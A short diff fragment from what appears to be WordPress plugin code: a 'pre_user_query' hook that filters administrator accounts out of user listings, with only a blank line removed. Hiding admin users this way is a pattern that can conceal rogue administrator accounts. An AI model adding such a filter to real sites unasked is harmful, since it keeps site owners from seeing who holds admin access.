@@ -28,7 +28,6 @@ function knox_pre_user_query($user_search) {
                     AND {$wpdb->usermeta}.meta_value NOT LIKE '%administrator%')",
 				$user_search->query_where
 			);
-
 	}
 }
 add_action('pre_user_query','knox_pre_user_query');
